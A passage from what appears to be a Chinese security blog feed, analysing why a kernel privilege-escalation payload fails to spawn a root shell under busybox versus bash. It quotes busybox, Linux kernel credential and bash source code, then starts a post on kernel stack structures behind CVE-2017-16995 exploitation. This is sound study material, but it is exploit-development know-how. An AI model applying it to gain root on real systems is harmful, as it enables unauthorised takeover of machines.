class="number">6</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ((sct-&gt;m_ugid.gid == rgid) || ingroup(ruid, sct-&gt;m_ugid.gid))</span><br><span class="line"><span class="comment">/* same group / in group */</span></span><br><span class="line">m &gt;&gt;= <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (!(m &amp; S_IXOTH)) <span class="comment">/* is x bit not set? */</span></span><br><span class="line">bb_error_msg_and_die(<span class="string">&quot;you have no permission to run this applet&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* We set effective AND saved ids. If saved-id is not set</span></span><br><span class="line"><span class="comment"> * like we do below, seteuid(0) can still later succeed! */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Are we directed to change gid</span></span><br><span class="line"><span class="comment"> * (APPLET = *s* USER.GROUP or APPLET = *S* USER.GROUP)?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (sct-&gt;m_mode &amp; S_ISGID)</span><br><span class="line">rgid = sct-&gt;m_ugid.gid;</span><br><span class="line"><span class="comment">/* else: we will set egid = rgid, thus dropping sgid effect */</span></span><br><span class="line"><span class="keyword">if</span> (setresgid(<span class="number">-1</span>, rgid, rgid))</span><br><span class="line">bb_perror_msg_and_die(<span class="string">&quot;setresgid&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Are we directed to change uid</span></span><br><span class="line"><span class="comment"> * (APPLET = s** USER.GROUP or APPLET = S** USER.GROUP)?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">uid = ruid;</span><br><span class="line"><span class="keyword">if</span> (sct-&gt;m_mode &amp; S_ISUID)</span><br><span class="line">uid = sct-&gt;m_ugid.uid;</span><br><span class="line"><span class="comment">/* else: we will set euid = ruid, thus dropping suid effect */</span></span><br><span class="line"><span class="keyword">if</span> (setresuid(<span class="number">-1</span>, uid, uid))</span><br><span class="line">bb_perror_msg_and_die(<span class="string">&quot;setresuid&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#   <span class="meta-keyword">if</span> !ENABLE_FEATURE_SUID_CONFIG_QUIET</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span> onetime = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!onetime) &#123;</span><br><span class="line">onetime = <span class="number">1</span>;</span><br><span class="line">bb_error_msg(<span class="string">&quot;using fallback suid method&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#   <span class="meta-keyword">endif</span></span></span><br><span class="line"> check_need_suid:</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (APPLET_SUID(applet_no) == BB_SUID_REQUIRE) &#123;</span><br><span class="line"><span class="comment">/* Real uid is not 0. If euid isn&#x27;t 0 too, suid bit</span></span><br><span class="line"><span class="comment"> * is most probably not set on our executable */</span></span><br><span class="line"><span class="keyword">if</span> (geteuid())</span><br><span class="line">bb_error_msg_and_die(<span class="string">&quot;must be suid to work properly&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (APPLET_SUID(applet_no) == BB_SUID_DROP) &#123;</span><br><span class="line">xsetgid(rgid);  <span class="comment">/* drop all privileges */</span> <span class="comment">// 如果我们只修改euid&amp;&amp;egid为0，不修改uid&amp;&amp;gid，就会执行这个分支语句，将所有id置为rxID</span></span><br><span class="line">xsetuid(ruid);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> ENABLE_FEATURE_SUID_CONFIG</span></span><br><span class="line"> ret: ;</span><br><span class="line">llist_free((<span class="keyword">llist_t</span>*)suid_config, <span class="literal">NULL</span>);</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数刚开始，我们就看到了关键，busybox判断了当前进程的uid是否是root，如果是，那么就不修改任何的xID，直接返回并执行对应的applet</p><p>这也就解释了为什么提权payload会失效的原因，当我们将<code>uid&amp;&amp;gid</code>设置为0后，busybox直接不做任何修改就执行了<code>/bin/sh</code>，导致本该被赋值成与<code>uid&amp;&amp;gid</code>一样的<code>euid&amp;&amp;egid</code>并没有被赋值，从而提权失败</p><p>这里插一个别的情况，如果我们只修改<code>euid&amp;&amp;egid</code>为0，不修改<code>uid&amp;&amp;gid</code>，那么会如何呢？</p><p>经过我的调试，如果只修改<code>euid&amp;&amp;egid</code>为0，那么xID将会经过如下的变迁过程</p><p>exp进程 -&gt; fork(uid=gid=1000,suid=sgid=1000,euid=egid=0,fsuid=fsgid=1000) -&gt; execve(execve将会修改suid/sgid,fsuid/fsgid代码见下方,修改后，uid=gid=1000,suid=sgid=euid=egid=fsuid=fsgid=0) -&gt; sh(由于setsid，setgid，此时uid=gid=suid=sgid=euid=egid=fsuid=fsgid=1000)</p><p>可以看到所有的id都将会被修改为<code>uid&amp;&amp;gid</code>对应的值，同样无法实现提权</p><p>这个情况倒是与bash是一致的</p><p>附上execve中修改xID部分的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * cap_bprm_set_creds - Set up the proposed credentials for execve().</span></span><br><span class="line"><span class="comment"> * @bprm: The execution parameters, including the proposed creds</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Set up the proposed credentials for a new execution context being</span></span><br><span class="line"><span class="comment"> * constructed by execve().  The proposed creds in @bprm-&gt;cred is altered,</span></span><br><span class="line"><span class="comment"> * which won&#x27;t take effect immediately.  Returns 0 if successful, -ve on error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cap_bprm_set_creds</span><span class="params">(struct linux_binprm *bprm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> current_cred();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span> =</span> bprm-&gt;cred;</span><br><span class="line"><span class="keyword">bool</span> effective, has_cap = <span class="literal">false</span>, is_setid;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">kuid_t</span> root_uid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(!cap_ambient_invariant_ok(old)))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">effective = <span class="literal">false</span>;</span><br><span class="line">ret = get_file_caps(bprm, &amp;effective, &amp;has_cap);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">root_uid = make_kuid(<span class="keyword">new</span>-&gt;user_ns, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!issecure(SECURE_NOROOT)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the legacy file capability is set, then don&#x27;t set privs</span></span><br><span class="line"><span class="comment"> * for a setuid root binary run by a non-root user.  Do set it</span></span><br><span class="line"><span class="comment"> * for a root user just to cause least surprise to an admin.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (has_cap &amp;&amp; !uid_eq(<span class="keyword">new</span>-&gt;uid, root_uid) &amp;&amp; uid_eq(<span class="keyword">new</span>-&gt;euid, root_uid)) &#123;</span><br><span class="line">warn_setuid_and_fcaps_mixed(bprm-&gt;filename);</span><br><span class="line"><span class="keyword">goto</span> skip;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * To support inheritance of root-permissions and suid-root</span></span><br><span class="line"><span class="comment"> * executables under compatibility mode, we override the</span></span><br><span class="line"><span class="comment"> * capability sets for the file.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If only the real uid is 0, we do not set the effective bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (uid_eq(<span class="keyword">new</span>-&gt;euid, root_uid) || uid_eq(<span class="keyword">new</span>-&gt;uid, root_uid)) &#123;</span><br><span class="line"><span class="comment">/* pP&#x27; = (cap_bset &amp; ~0) | (pI &amp; ~0) */</span></span><br><span class="line"><span class="keyword">new</span>-&gt;cap_permitted = cap_combine(old-&gt;cap_bset,</span><br><span class="line"> old-&gt;cap_inheritable);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (uid_eq(<span class="keyword">new</span>-&gt;euid, root_uid))</span><br><span class="line">effective = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">skip:</span><br><span class="line"></span><br><span class="line"><span class="comment">/* if we have fs caps, clear dangerous personality flags */</span></span><br><span class="line"><span class="keyword">if</span> (!cap_issubset(<span class="keyword">new</span>-&gt;cap_permitted, old-&gt;cap_permitted))</span><br><span class="line">bprm-&gt;per_clear |= PER_CLEAR_ON_SETID;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Don&#x27;t let someone trace a set[ug]id/setpcap binary with the revised</span></span><br><span class="line"><span class="comment"> * credentials unless they have the appropriate permit.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In addition, if NO_NEW_PRIVS, then ensure we get no new privs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">is_setid = !uid_eq(<span class="keyword">new</span>-&gt;euid, old-&gt;uid) || !gid_eq(<span class="keyword">new</span>-&gt;egid, old-&gt;gid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((is_setid ||</span><br><span class="line">     !cap_issubset(<span class="keyword">new</span>-&gt;cap_permitted, old-&gt;cap_permitted)) &amp;&amp;</span><br><span class="line">    bprm-&gt;unsafe &amp; ~LSM_UNSAFE_PTRACE_CAP) &#123;  <span class="comment">// 如果只修改euid和egid为0，保持uid以及suid为0x3，就不会进到这个分支</span></span><br><span class="line"><span class="comment">/* downgrade; they get no more than they had, and maybe less */</span></span><br><span class="line"><span class="keyword">if</span> (!capable(CAP_SETUID) ||</span><br><span class="line">    (bprm-&gt;unsafe &amp; LSM_UNSAFE_NO_NEW_PRIVS)) &#123;</span><br><span class="line"><span class="keyword">new</span>-&gt;euid = <span class="keyword">new</span>-&gt;uid;</span><br><span class="line"><span class="keyword">new</span>-&gt;egid = <span class="keyword">new</span>-&gt;gid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span>-&gt;cap_permitted = cap_intersect(<span class="keyword">new</span>-&gt;cap_permitted,</span><br><span class="line">   old-&gt;cap_permitted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>-&gt;suid = <span class="keyword">new</span>-&gt;fsuid = <span class="keyword">new</span>-&gt;euid; <span class="comment">// 修改了sID以及fsID</span></span><br><span class="line"><span class="keyword">new</span>-&gt;sgid = <span class="keyword">new</span>-&gt;fsgid = <span class="keyword">new</span>-&gt;egid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* File caps or setid cancels ambient. */</span></span><br><span class="line"><span class="keyword">if</span> (has_cap || is_setid)</span><br><span class="line">cap_clear(<span class="keyword">new</span>-&gt;cap_ambient);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Now that we&#x27;ve computed pA&#x27;, update pP&#x27; to give:</span></span><br><span class="line"><span class="comment"> *   pP&#x27; = (X &amp; fP) | (pI &amp; fI) | pA&#x27;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">new</span>-&gt;cap_permitted = cap_combine(<span class="keyword">new</span>-&gt;cap_permitted, <span class="keyword">new</span>-&gt;cap_ambient);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set pE&#x27; = (fE ? pP&#x27; : pA&#x27;).  Because pA&#x27; is zero if fE is set,</span></span><br><span class="line"><span class="comment"> * this is the same as pE&#x27; = (fE ? pP&#x27; : 0) | pA&#x27;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (effective)</span><br><span class="line"><span class="keyword">new</span>-&gt;cap_effective = <span class="keyword">new</span>-&gt;cap_permitted;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">new</span>-&gt;cap_effective = <span class="keyword">new</span>-&gt;cap_ambient;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(!cap_ambient_invariant_ok(<span class="keyword">new</span>)))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">bprm-&gt;cap_effective = effective;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Audit candidate if current-&gt;cap_effective is set</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We do not bother to audit if 3 things are true:</span></span><br><span class="line"><span class="comment"> *   1) cap_effective has all caps</span></span><br><span class="line"><span class="comment"> *   2) we are root</span></span><br><span class="line"><span class="comment"> *   3) root is supposed to have all caps (SECURE_NOROOT)</span></span><br><span class="line"><span class="comment"> * Since this is just a normal root execing a process.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Number 1 above might fail if you don&#x27;t have a full bset, but I think</span></span><br><span class="line"><span class="comment"> * that is interesting information to audit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!cap_issubset(<span class="keyword">new</span>-&gt;cap_effective, <span class="keyword">new</span>-&gt;cap_ambient)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!cap_issubset(CAP_FULL_SET, <span class="keyword">new</span>-&gt;cap_effective) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;euid, root_uid) || !uid_eq(<span class="keyword">new</span>-&gt;uid, root_uid) ||</span><br><span class="line">    issecure(SECURE_NOROOT)) &#123;</span><br><span class="line">ret = audit_log_bprm_fcaps(bprm, <span class="keyword">new</span>, old);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>-&gt;securebits &amp;= ~issecure_mask(SECURE_KEEP_CAPS);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WARN_ON(!cap_ambient_invariant_ok(<span class="keyword">new</span>)))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然都看了busybox的实现，那就顺便看看bash的实现，看看是不是符合我们的预期</p><p>bash中设置权限代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">main (argc, argv, env)</span><br><span class="line">     <span class="keyword">int</span> argc;</span><br><span class="line">     <span class="keyword">char</span> **argv, **env;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !NO_MAIN_ENV_ARG */</span></span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">running_setuid = uidget (); <span class="comment">// 这里由于uid&amp;&amp;gid与euid&amp;&amp;egid不同，所以running_setuid为1</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (running_setuid &amp;&amp; privileged_mode == <span class="number">0</span>) <span class="comment">// privileged_mode默认为0，当bash以-p启动时，此值为1</span></span><br><span class="line">    disable_priv_mode ();  <span class="comment">//执行此函数</span></span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中关键函数及变量的实现如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* Non-zero means that this shell is running in `privileged&#x27; mode.  This</span></span><br><span class="line"><span class="comment">   is required if the shell is to run setuid.  If the `-p&#x27; option is</span></span><br><span class="line"><span class="comment">   not supplied at startup, and the real and effective uids or gids</span></span><br><span class="line"><span class="comment">   differ, disable_priv_mode is called to relinquish setuid status. */</span></span><br><span class="line"><span class="keyword">int</span> privileged_mode = <span class="number">0</span>;</span><br><span class="line">......</span><br><span class="line"><span class="comment">/* Fetch the current set of uids and gids and return 1 if we&#x27;re running</span></span><br><span class="line"><span class="comment">   setuid or setgid. */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">uidget ()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">uid_t</span> u;</span><br><span class="line"></span><br><span class="line">  u = getuid ();</span><br><span class="line">  <span class="keyword">if</span> (current_user.uid != u)</span><br><span class="line">    &#123;</span><br><span class="line">      FREE (current_user.user_name);</span><br><span class="line">      FREE (current_user.shell);</span><br><span class="line">      FREE (current_user.home_dir);</span><br><span class="line">      current_user.user_name = current_user.shell = current_user.home_dir = (<span class="keyword">char</span> *)<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  current_user.uid = u;</span><br><span class="line">  current_user.gid = getgid ();</span><br><span class="line">  current_user.euid = geteuid ();</span><br><span class="line">  current_user.egid = getegid ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* See whether or not we are running setuid or setgid. */</span></span><br><span class="line">  <span class="keyword">return</span> (current_user.uid != current_user.euid) ||</span><br><span class="line">   (current_user.gid != current_user.egid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">disable_priv_mode ()</span><br><span class="line">&#123;</span><br><span class="line">  setuid (current_user.uid);</span><br><span class="line">  setgid (current_user.gid);</span><br><span class="line">  current_user.euid = current_user.uid;</span><br><span class="line">  current_user.egid = current_user.gid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，如我们之前所推断的，bash与busybox在初始化的过程中确实有着一定的差别</p><p>另外提一嘴，要注意在我们的exp中调用了<code>system(&quot;/bin/bash&quot;)</code>，但实际上并不是<code>exp进程-&gt;/bin/bash</code>,而是<code>exp进程-&gt;/bin/sh -c /bin/bash -&gt; /bin/bash</code>，不过呢，由于<code>/bin/sh</code>一般都被软链至<code>dash</code>或者是<code>bash</code>, 所以在设置权限的行为上，与我们上面说的<code>bash</code>行为是一致的，你也可以把它看成<code>exp进程-&gt;/bin/bash -c /bin/bash -&gt; /bin/bash</code>，这并不影响权限设置的逻辑</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-16995 -- 结构</title>
      <link href="CVE-2017-16995-structure.html"/>
      <url>CVE-2017-16995-structure.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>仅为记录一些内核重要结构的知识点，系统学习还是要靠自己</p><p>以下知识点皆基于<code>linux-4.5</code></p><h1 id="内核进程栈"><a href="#内核进程栈" class="headerlink" title="内核进程栈"></a>内核进程栈</h1><p>这个想必大家已经很熟悉了，我就记录一点零碎的知识点</p><h2 id="内核栈的大小及构成"><a href="#内核栈的大小及构成" class="headerlink" title="内核栈的大小及构成"></a>内核栈的大小及构成</h2><p>内核栈的大小由<code>thread_union</code>决定</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">thread_union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于这是一个<code>union</code>类型的结构，所以重要的线程描述符<code>thread_info</code>结构体必然位于每一个进程栈的栈顶</p><p>也同样是由于是<code>union</code>类型，所以内核栈大小取决于<code>stack</code>的大小，而这又取决于<code>THREAD_SIZE</code>的大小，这同样是一个很重要的宏，在<code>x86_64</code>的机器上，定义于<code>arch/x86/include/asm/page_64_types.h</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN <span class="comment">// 在boot阶段就unset了CONFIG_KASAN宏，所以KASAN_STACK_ORDER取0</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KASAN_STACK_ORDER 1  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KASAN_STACK_ORDER 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SIZE_ORDER(2 + KASAN_STACK_ORDER)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SIZE  (PAGE_SIZE &lt;&lt; THREAD_SIZE_ORDER) <span class="comment">// PAGE_SIZE为0x1000</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CURRENT_MASK (~(THREAD_SIZE - 1))</span></span><br></pre></td></tr></table></figure><p>计算得到<code>THREAD_SIZE = 0x1000 &lt;&lt; 2 = 0x4000</code></p><p>此值在内核编译时就完成，编译完成后即不可修改，并且内核栈一定是严格对齐其大小，换句话说，知道任意一个进程栈的指针，进行如下运算</p><p><code>fp &amp; ~(0x4000-1) = &amp;thread_info</code></p><p>就可以得到<code>thread_info</code>结构体的地址</p><p>这里要注意一点，就是内核栈总大小虽然为<code>0x4000</code>，但是，rsp所能指向的区域范围却小于<code>0x4000</code>，原因在下面这张图中可以看出(图中current指针有误)</p><p><img src="/image/CVE-2017-16995/kernel_stack.jpg" alt="kernel_stack"></p><p>在这张图的基础上，可以得知以下3点</p><ol><li>rsp寄存器是CPU栈指针，用来存放栈顶单元的地址。在80x86系统中，栈起始于顶端，并朝着这个内存区开始的方向增长。从用户态刚切换到内核态以后，进程的内核栈总是空的。因此，rsp寄存器指向这个栈的顶端。一旦数据写入堆栈，rsp的值就递减</li><li>thread_info和内核栈虽然共用了thread_union结构, 但是thread_info大小固定, 存储在联合体的开始部分, 而内核栈由高地址向低地址扩展, 当内核栈的栈顶到达thread_info的存储空间时, 则会发生栈溢出,这也是为什么rsp所能移动的范围小于<code>0x4000</code></li><li>进程task_struct中的stack指针指向了进程的thread_union(或者thread_info)的地址, 在早期的内核中这个指针用struct thread_info *thread_info来表示, 但是新的内核中用了一个更浅显的名字void *stack, 即内核栈</li></ol><p>PS: 在最新的内核上(当前为5.11)，thread_union结构体已经有很大变化，关键的task_struct指针成员将不再保存在栈上，而是作为一个per_cpu变量储存在<code>.data..percpu</code>段上，这个段的基地址将会被保存在fs寄存器(64位)中，所以类似CVE-2017-16995的漏洞利用方式将会失效</p><h1 id="Current"><a href="#Current" class="headerlink" title="Current"></a>Current</h1><p>Current宏也算是内核中最为重要的宏之一，其是一个全局指针，指向caller进程的<code>task_struct</code>结构体</p><p>来看看他的实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>currentget_current()</span></span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct task_struct *<span class="title">get_current</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span>(current_thread_info()-&gt;task);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出实际上是调用了<code>get_current</code>函数，来看看<code>current_thread_info</code>的实现细节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct thread_info *<span class="title">current_thread_info</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (struct thread_info *)(current_top_of_stack() - THREAD_SIZE); <span class="comment">// THREAD_SIZE为0x4000</span></span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span 